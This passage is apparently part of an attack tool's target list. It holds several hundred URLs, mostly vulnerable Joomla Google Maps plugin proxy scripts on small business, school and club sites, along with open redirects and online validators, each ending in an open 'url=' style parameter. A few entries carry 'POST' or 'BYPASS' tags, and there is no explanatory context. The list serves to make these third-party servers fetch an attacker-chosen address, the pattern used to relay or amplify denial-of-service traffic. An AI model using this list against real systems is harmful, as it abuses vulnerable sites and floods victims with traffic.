"http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=",
"http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=",
"http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
"http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
"http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS",
"http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
"http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
"http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
"http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=",
"http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=",
"http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&Url=",
"http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
"http://validator.w3.org/nu/?doc=",
"http://www.netvibes.com/subscribe.php?url=",
"http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.google.com/ig/add?feedurl=",
"http://www.google.com/translate?u=",
"http://translate.google.com/translate?u=",
"http://validator.w3.org/feed/check.cgi?url=",
"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
"http://validator.w3.org/check?uri=",
"http://jigsaw.w3.org/css-validator/validator?uri=",
"http://validator.w3.org/checklink?uri=",
"http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
"http://www.w3.org/RDF/Validator/ARPServlet?URI=",
"http://www.w3.org/services/tidy?docAddr=",
"http://validator.w3.org/mobile/check?docAddr=",
"http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
"http://validator.w3.org/p3p/20020128/policy.pl?uri=",
"http://online.htmlvalidator.com/php/onlinevallite.php?url=",
"http://feedvalidator.org/check.cgi?url=",
"http://gmodules.com/ig/creator?url=",
"http://www.google.com/ig/adde?moduleurl=",
"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
"http://host-tracker.com/check_page/?furl=",
"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
"http://www.viewdns.info/ismysitedown/?domain=",
"http://www.onlinewebcheck.com/check.php?url=",
"http://about42.nl/www/showheaders.php;POST;about42.nl.txt",
"http://browsershots.org;POST;browsershots.org.txt",
"http://streamitwebseries.twww.tv/proxy.php?url=",
"http://www.comicgeekspeak.com/proxy.php?url=",
"http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
"http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=",
"http://web-sniffer.net/?url=",
"http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=",
"http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
"http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
"http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
"http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
"http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
"http://regex.info/exif.cgi?url=",
"https://safeweb.norton.com/report/show?url=",
"http://forum.buffed.de/redirect.php?url=",
"http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=",
"http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=",
"http://validator.w3.org/feed/check.cgi?url=",
"http://www.sadsong.net/redirect.php?url=",
"http://validator.w3.org/checklink?uri=",
"http://ruforum.mt5.com/redirect.php?url=",
"http://www.seowizard.ir/redirect.php?url=",
"http://jigsaw.w3.org/css-validator/validator?uri=",
"http://www.airberlin.com/site/redirect.php?url=",
"http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=",
"http://www.phuketbranches.com/admin/redirect.php?url=",
"http://palinstravels.co.uk/redirect.php?url=",
"http://www.elec-intro.com/redirect.php?url=",
"http://tools.strugacreative.com/redirect.php?url=",
"http://zakaztovarov.net/redirect.php?url=",
"http://old.leginet.eu/redirect.php?url=",
"http://www.seo.khabarsaz.net/redirect.php?url=",
"http://www.am-segelhafen-hotel.com/files/ash_hotel/proxy.php?url=",
"http://www.dimension-marketing.net/outils/seo/audit/redirect.php?url=",
"http://www.cbpp.org/cms/sites/all/modules/ckeditor_link/proxy.php?url=",
"http://weiter-lesen.net/web/proxy.php?url=",
"http://www.hangglider.kiev.ua/go.php?url=",
"http://www.accuride.co.jp/cgi/check.cgi?URL=",
"http://it4pal.com/ar/go.php?url=",
"http://paperplane.su/go.php?url=",
"http://ukrhome.net/go.php?url=",
"http://www.bloggerexp.com/go.php?url=",
"http://www.ennk.ru/go.php?url=",
"http://www.education.net.au/go.php?url=",
"https://www.google.com/interstitial?url=",
"http://www.geodream.ru/go.php?url=",
"http://www.xoxohth.com/go.php?url=",
"http://www.autoadmit.com/go.php?url=",
"http://www.roetti.de/Oststammtisch-Forum/Forum/go.php?url=",
"http://www.vttour.fr/actu/go.php?url=",
"http://jp.trefoil.tv/go.php?url=",
"http://irc.ifmo.ru/go.php?url=",
"http://www.dandelionradio.com/go.php?url=",
"http://rusbody.com/go.php?url=",
"http://hao.zw51.cn/go.php?url=",
"http://www.health.omskinform.ru/go.php?url=",
"http://www.treasure-vacations.com/go.php?url=",
"http://www.deutsche-krieger.de/go.php?url=",
"http://engelcosmetology.kiev.ua/go.php?url=",
"http://www.go.php-fusion-iran.com/go.php?url=",
"http://valaholeuropaban.uw.hu/guestbook/go.php?url=",
"http://vps.cohenrisk.com/~xoxohth/go.php?url=",
"http://enrique-iglesias.net/guestbook/go.php?url=",
"http://www.ninja-thailand.com/go.php?url=",
"http://www.find-a-car.info/go.php?url=",
"http://www.jonko.eu/tools/hide_referrer/go.php?url=",
"http://www.quelsoft.com/go.php?url=",
"http://www.xohth.com/beta/go.php?url=",
"http://auctionsinfo.net76.net/go.php?url=",
"http://ec2-50-17-240-22.compute-1.amazonaws.com/blog/go.php?url=",
"http://m-bizportal.ru/go.php?url=",
"http://webmasterplus.us/go/go.php?url=",
"http://www.sportzone.ru/go.php?url=",
"http://shopdazzles.com/guestbook/go.php?url=",
"http://autoqa.org/go.php?url=",
"http://7days.kiev.ua/go.php?url=",
"http://depressionclub.awardspace.com/go.php?url=",
"http://www.recipes.portalnews.de/go.php?url=",
"http://www.jenteporten.no/go.php?url=",
"http://www.beautytipsadvice.infoslobber.com/go.php?url=",
"http://spiritual-link.com/go.php?url=",
"http://www.backpacker.no/go.php?url=",
"http://www.totalwars.ru/go.php?url=",
"http://www.qosmo.com/go.php?url=",
"http://www.1001topwords.com/marketing1/marketing/go.php?url=",
"http://ww3.myonlinestats.com/go/go.php?url=",
"http://monkeezemarketing.com/go.php?url=",
"http://www.flohmarkt.ch/redirect.php?page=",
"http://mcpe.tw/go.php?url=",
"http://www.pia.org/IRC/qs/redirect.php?page=",
"http://www.pcpros-tx.com/php/redirect.php?page=",
"http://www.netintellgames.com/redirect.php?page=",
"http://www.taosadultbasketballleague.com/redirect.php?page=",
"http://www.graphisoftus.com/redirect.php?page=",
"http://tzf.free.fr/redirect.php?page=",
"http://www.anglobelge.com/EN/splash-page/redirect.php?page=",
"http://taosadultbasketball.com/redirect.php?page=",
"http://www.tandem-club.org.uk/files/public_html/redirect.php?page=",
"http://rawlab.mindcreations.com/redirect.php?page=",
"http://signaturesx.com/redirect.php?page=",
"http://www.hxtrack.com/redirect.php?page=",
"http://www.centromorin.it/aspnuke207/gotoURL.asp?url=",
"http://www.pillole.org/public/aspnuke/gotoURL.asp?url=",
"http://win.aiafa.it/gotoURL.asp?url=",
"http://www.monteargentario.it/gotoURL.asp?url=",
"http://www.trasporti.marche.it/nuke/gotoURL.asp?url=",
"http://www.chiauci-webforum.it/gotoURL.asp?url=",
"http://www.dffyw.com/dir/gotourl.asp?url=",
"http://www.icfpet.it/gotoURL.asp?url=",
"http://www.aspnuke.it/gotoURL.asp?url=",
"http://www.confederazionestellareitaliana.com/portale/gotoURL.asp?url=",
"http://www.aicritalia.org/gotoURL.asp?url=",
"http://www.mentalism.it/gotoURL.asp?url=",
"http://www.ematube.it/gotoURL.asp?url=",
"http://www.golfclubambrosiano.it/gotoURL.asp?url=",
"http://resuite.upg.it/gotoURL.asp?url=",
"https://www.google.pl/interstitial?url=",
"http://www.unicyclist.it/gotoURL.asp?url=",
"http://www.ghz.it/gotoURL.asp?url=",
"http://www.idealdieta.it/gotoURL.asp?url=",
"http://www.smsenjoy.eu/gotourl.asp?url=",
"http://www.bankingandfinancelab.it/gotoURL.asp?url=",
"http://www.pigneto.it/gotoURL.asp?url=",
"http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.betnwin.net/sportbet/gotoURL.asp?url=",
"http://www.psycommunity.it/gotoURL.asp?url=",
"http://www.w3.org/RDF/Validator/ARPServlet?URI=",
"http://www.google.com/translate?u=",
"https://www.cheapassgamer.com/redirect.php?url=",
"http://streamitwebseries.twww.tv/proxy.php?url=",
"http://www.onlinewebcheck.com/check.php?url=",
"http://online.htmlvalidator.com/php/onlinevallite.php?url=",
"http://host-tracker.com/check_page/?furl=",
"http://ca.dakine.com/Home/SelectRegion?returnUrl=",
"http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.answers.com/Q/What_does_la_pagina_meanpagina=",
"http://worldwide.promega.com/country.aspx?returnUrlreturnUrl=",
"http://apidock.com/rails/ActionController/Base/url_forurl=",
"http://daimi.au.dk/CPnets/proxy.php?url=",
"http://www.eurasiam.com/proxy.php?url=",
"http://www.yiiframework.com/forum/index.php/topic/15090-returnurl-is-indexphp/returnUrl=",
"http://www.ianfernando.com/if/index.php?url=",
"http://byte.me.uk/index.php?url=",
"http://www.arakhne.org/redirect.php?url=",
"http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
"http://go.20script.ir/index.php?url=",
"http://www.legacy-game.net/redirect.php?url=",
"http://www.daimi.au.dk/CPnets/proxy.php?url=",
"http://www.24livenewspaper.com/site/index.php?url=",
"http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://thuonghieunguoiviet.com.vn/index.php?url=",
"http://www.basesoft.com.br/proxy.php?url=",
"http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://brangerbriz.net/labs/threejs_playGnd/texturez/proxy.php?url=",
"http://www.orangesoftware.nl/mailing/proxy.php?url=",
"http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.musikalienhandel.de/proxy/proxy.php?url=",
"http://www.cheapfareguru.com/redirect.php?url=",
"http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://ivrr.de/proxy.php?url=",
"http://www.webeyn.com/git.php?url=",
"http://www.haberoku.com/iframe.php?url=",
"http://www.embedder.eu/frame.php?url=",
"http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
"http://www.cargonet.cz/doprava/index.php?url=",
"http://www.usacycling.org/coaches/CoachWaiver.php?url=",
"http://www.edialgroup.com/idx.php?url=",
"http://water.weather.gov/ahps2/nwsexit.php?url=",
"https://ecolet.ro/zdesk/pnp/proxy.php?url=",
"http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
"https://www.newzealandgirls.co.nz/all/proxy.php?url=",
"http://www.exn.ro/redirect.php?url=",
"http://www.smartelectronix.com/refer.php?url=",
"http://www.egraphic.ru/report.php?url=",
"http://www.scwa.ca.gov/lower.php?url=",
"http://www.e39-forum.de/redir.php?url=",
"http://facenama.com/go.php?url=",
"http://www.selectsmart.com/plus/select.php?url=",
"http://www.mientay24h.vn/redirector.php?url=",
"http://www.php.net/source.php?url=",
"http://www.taichinh2a.com/forum/links.php?url=",
"http://www.wopus.org/wp-content/themes/begin/inc/go.php?url=",
"http://www.kapook.com/webout.php?url=",
"http://www.hitutor.com.tw/login-s.php?url=",
"http://ekav.info/search/l.php?url=",
"http://www.logect.com/l.php?url=",
"http://reebokstore.trackonomics.net/iframe_proxy.php?url=",
"https://blog.eduzones.com/redirect.php?url=",
"http://www.filezaap.com/redir.php?url=",
"http://www.dedbit.com/redir.php?url=",
"http://health.cat/open.php?url=",
